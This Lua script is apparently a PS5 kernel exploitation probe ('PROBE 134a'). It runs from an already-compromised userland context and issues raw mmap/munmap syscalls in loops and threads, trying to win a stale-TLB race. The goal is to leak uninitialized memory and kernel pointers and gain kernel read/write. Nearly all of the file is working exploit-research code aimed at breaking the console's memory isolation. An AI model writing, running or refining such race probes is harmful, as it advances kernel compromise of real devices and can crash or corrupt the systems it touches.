-- CRASH_CLASS: HIGH
-- PROBE 134a: mmap/munmap page table race with stale TLB
--
-- Race: Thread A munmaps a GPU region while Thread B reads/writes it.
-- 16KB pages on PS5 make TLB invalidation slower = wider race window.
-- If Thread B accesses a page after munmap but before TLB flush,
-- it hits a recycled physical page (potentially kernel metadata).
--
-- Design:
--   1. mmap large GPU region (256 pages)
--   2. Write known pattern to all pages
--   3. Thread A: munmap the region
--   4. Thread B: immediately read pages, compare against pattern
--   5. Any mismatch = stale TLB hit on recycled page = kernel R/W

print("=== PROBE 134a: MMAP/MUNMAP RACE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local has_rax = native and native.fcall_with_rax
local stub = has_rax and syscall.pipe.fn_addr or nil
print("has_rax=" .. tostring(has_rax ~= nil))

if not has_rax then
    print("NEED native.fcall_with_rax — aborting")
    print("=== PROBE 134a COMPLETE ===")
    return
end

local thrd_create_fn = fcall(libc_addrofs.Thrd_create)
local thrd_join_fn = fcall(libc_addrofs.Thrd_join)

-- ============================================================
-- PHASE 1: Test mmap + munmap cycle
-- ============================================================
print("")
print("--- PHASE 1: MMAP/MUNMAP TEST ---")

local PAGE_SIZE = 0x4000  -- 16KB
local NUM_PAGES = 64
local MAP_SIZE = PAGE_SIZE * NUM_PAGES

-- mmap(477): addr=0, len, prot=RW(3), flags=MAP_ANON|MAP_PRIVATE(0x1002), fd=-1, offset=0
local region = to_num(native.fcall_with_rax(stub, 477, 0, MAP_SIZE, 3, 0x1002, 0xFFFFFFFF, 0))
print("mmap region=" .. string.format("0x%X", region))

if region == 0 or region >= 0xFFFFFFFF00000000 then
    print("mmap failed — trying GPU mmap")
    region = to_num(native.fcall_with_rax(stub, 477, 0, MAP_SIZE, 0x33, 0x1002, 0xFFFFFFFF, 0))
    print("GPU mmap region=" .. string.format("0x%X", region))
end

if region ~= 0 and region < 0xFFFFFFFF00000000 then
    -- Write pattern
    local pattern = 0xDEADBEEFCAFE0000
    for pg = 0, NUM_PAGES - 1 do
        local ok = pcall(function()
            memory.write_qword(uint64(region + pg * PAGE_SIZE), uint64(pattern + pg))
        end)
        if not ok and pg == 0 then
            print("Cannot write to mmap region")
            break
        end
    end

    -- Verify pattern
    local v0 = safe_rq(uint64(region))
    print("pattern check [0]=" .. fmt_addr(v0))

    -- munmap(73): addr, len
    local unmap_ret = to_num(native.fcall_with_rax(stub, 73, region, MAP_SIZE))
    print("munmap ret=" .. unmap_ret)

    -- Try reading after munmap (should crash/SIGSEGV normally)
    local post_val = safe_rq(uint64(region))
    print("post-munmap read=" .. fmt_addr(post_val))
    if post_val ~= nil then
        print("*** PAGE STILL ACCESSIBLE AFTER MUNMAP ***")
        local h, l = get_hi_lo(post_val)
        if h ~= get_hi_lo(uint64(pattern)) then
            print("*** DIFFERENT DATA — STALE TLB HIT ***")
        end
    end
else
    print("mmap failed completely")
end

print("canary1: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- PHASE 2: Rapid mmap/munmap/mmap race
-- ============================================================
print("")
print("--- PHASE 2: RAPID REMAP RACE ---")

-- Race: mmap → write → munmap → mmap(same size) → read
-- If new mmap gets overlapping phys pages, old data persists = info leak
local ROUNDS = 100
local leak_count = 0
local SMALL_SIZE = PAGE_SIZE * 4  -- 4 pages per round

for round = 1, ROUNDS do
    -- mmap region A
    local a = to_num(native.fcall_with_rax(stub, 477, 0, SMALL_SIZE, 3, 0x1002, 0xFFFFFFFF, 0))
    if a == 0 or a >= 0xFFFFFFFF00000000 then break end

    -- Write marker
    pcall(function() memory.write_qword(uint64(a), uint64(0xAAAA000000000000 + round)) end)
    pcall(function() memory.write_qword(uint64(a + PAGE_SIZE), uint64(0xBBBB000000000000 + round)) end)

    -- munmap
    native.fcall_with_rax(stub, 73, a, SMALL_SIZE)

    -- mmap again (different size to get different VA but maybe same phys)
    local b = to_num(native.fcall_with_rax(stub, 477, 0, SMALL_SIZE, 3, 0x1002, 0xFFFFFFFF, 0))
    if b == 0 or b >= 0xFFFFFFFF00000000 then break end

    -- Read new region — should be zero (fresh anonymous mapping)
    local v = safe_rq(uint64(b))
    if v ~= nil then
        local h, l = get_hi_lo(v)
        if h ~= 0 or l ~= 0 then
            leak_count = leak_count + 1
            if leak_count <= 10 then
                print(string.format("round %d: UNINITIALIZED DATA at 0x%X: %s%s",
                    round, b, fmt_addr(v),
                    is_kptr(v) and " ***KPTR***" or ""))
            end
        end
    end

    -- Cleanup
    native.fcall_with_rax(stub, 73, b, SMALL_SIZE)

    if round % 25 == 0 then
        if not pcall(function() return to_num(syscall.getpid()) end) then
            print("CRASH at round " .. round); break
        end
    end
end

print("Uninitialized data leaks: " .. leak_count .. " / " .. ROUNDS)

-- ============================================================
-- PHASE 3: Threaded munmap race
-- ============================================================
print("")
print("--- PHASE 3: THREADED MUNMAP RACE ---")

-- We need a function the thread can call that does munmap.
-- munmap takes (addr, len) but Thrd_create gives fn(arg) with ONE arg.
-- We can't directly call munmap from thread without a wrapper.
--
-- Alternative: Thread reads memory while main unmaps it.
-- Thread entry = memcpy(dst, src=mmap_region, len) via libc memcpy
-- Main: munmap the region while thread is copying
-- If thread reads during/after munmap = stale access

local memcpy_fn = libc_addrofs.memcpy
if memcpy_fn then
    print("memcpy available — but thread entry is fn(arg) with single arg")
    print("Cannot pass 3 args to memcpy from Thrd_create")
end

-- Simpler approach: thread does an atomic_fetch_add on the mmap region
-- while main unmaps it. If the add lands after unmap = stale write
local atomic_fn = libc_addrofs.Atomic_fetch_add_8
if atomic_fn then
    print("Using Atomic_fetch_add_8 on mmap region while main unmaps")

    local t_leaks = 0
    for round = 1, 100 do
        local region2 = to_num(native.fcall_with_rax(stub, 477, 0, PAGE_SIZE, 3, 0x1002, 0xFFFFFFFF, 0))
        if region2 == 0 or region2 >= 0xFFFFFFFF00000000 then break end

        -- Write known value
        pcall(function() memory.write_qword(uint64(region2), uint64(0)) end)

        -- Thread: atomic_add(region, 1) — reads+writes the mmap page
        local thr = memory.alloc(8)
        memory.write_qword(thr, 0)
        pcall(thrd_create_fn, thr, atomic_fn, uint64(region2))

        -- Main: immediately munmap
        native.fcall_with_rax(stub, 73, region2, PAGE_SIZE)

        -- Immediately remap
        local region3 = to_num(native.fcall_with_rax(stub, 477, 0, PAGE_SIZE, 3, 0x1002, 0xFFFFFFFF, 0))

        sleep(0.01, 's')
        pcall(thrd_join_fn, memory.read_qword(thr), uint64(0))

        -- Check if new region has unexpected data
        if region3 > 0 and region3 < 0xFFFFFFFF00000000 then
            local nv = safe_rq(uint64(region3))
            if nv then
                local h, l = get_hi_lo(nv)
                if h ~= 0 or l ~= 0 then
                    t_leaks = t_leaks + 1
                    if t_leaks <= 5 then
                        print(string.format("round %d: LEAK at 0x%X: %s", round, region3, fmt_addr(nv)))
                    end
                end
            end
            native.fcall_with_rax(stub, 73, region3, PAGE_SIZE)
        end

        if round % 25 == 0 then
            if not pcall(function() return to_num(syscall.getpid()) end) then
                print("CRASH at round " .. round); break
            end
        end
    end

    print("Thread munmap leaks: " .. t_leaks)
else
    print("No Atomic_fetch_add_8 — skipping threaded munmap race")
end

print("")
print("canary_final: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 134a COMPLETE ===")
